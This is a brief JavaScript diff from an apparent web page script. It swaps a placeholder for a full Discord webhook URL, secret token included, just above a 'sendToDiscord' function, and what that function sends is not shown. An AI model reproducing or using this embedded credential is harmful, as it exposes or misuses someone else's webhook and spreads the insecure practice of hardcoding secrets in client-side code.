@@ -65,7 +65,7 @@ document.getElementById("search-input").addEventListener("input", function () {
   });
   
   // Webhook Discord configuration
-  const DISCORD_WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
+  const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1358667839388647454/V0-AyioPMYCLadawU7MF0gqrcFRMBRBm585fvhHeHq2PyR-VVe_UcDEOIfhEuT0JovtJ';
   
   // Function to send data to Discord webhook
   async function sendToDiscord(message, type) {
